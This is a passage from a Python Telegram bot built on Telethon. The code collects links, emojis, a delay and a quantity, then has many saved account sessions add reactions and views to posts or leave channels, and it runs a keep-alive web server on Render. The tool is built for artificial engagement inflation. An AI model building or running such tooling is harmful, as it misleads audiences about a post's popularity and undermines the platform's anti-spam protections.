    elif state.get('type') in ('react_view', 'multi_react'):
        if state['step'] == 'link':
            links = text.strip().splitlines()
            valid = [{'link': l, 'type': parse_target(l)[0], 'target': parse_target(l)[1]} for l in links if parse_target(l)[0]]
            state['links_data'] = valid
            state['step'] = 'emoji'
            await event.respond(style_text("Enter emoji:"), buttons=get_cancel())
        elif state['step'] == 'emoji':
            if state['type'] == 'react_view':
                state['emoji'] = text.strip()
            else:
                state['emojis'] = [e.strip() for e in text.split(',') if e.strip()]
            state['step'] = 'speed'
            await event.respond(style_text("Enter speed delay:"), buttons=get_cancel())
        elif state['step'] == 'speed':
            try:
                state['speed'] = float(text.replace(',', '.'))
            except:
                state['speed'] = 0.2
            state['step'] = 'qty'
            await event.respond(style_text("Select quantity:"), buttons=get_qty_buttons())

    elif state.get('type') == 'views':
        if state.get('subtype') == 'single':
            if state['step'] == 'link':
                state['post_link'] = text.strip()
                state['step'] = 'qty'
                await event.respond(style_text("Select quantity:"), buttons=get_views_qty_buttons())
        elif state.get('subtype') == 'batch':
            if state['step'] == 'links':
                await execute_views_batch(event, text, len(active_clients))

    elif state.get('type') == 'leave_specific':
        if state['step'] == 'link':
            await execute_leave_specific(event, text)

# --- RENDER WEB SERVER PING SETUP ---
async def handle_ping(request):
    return web.Response(text="Bot is running smoothly on Render!")

async def start_web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"Web server started on port {port}")

async def main():
    print("=" * 60)
    print("🤖 RENDER BOT RUNNING WITH TELETHON VC MONITOR")
    print("=" * 60)
    await start_saved_clients()
    await start_web_server()
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
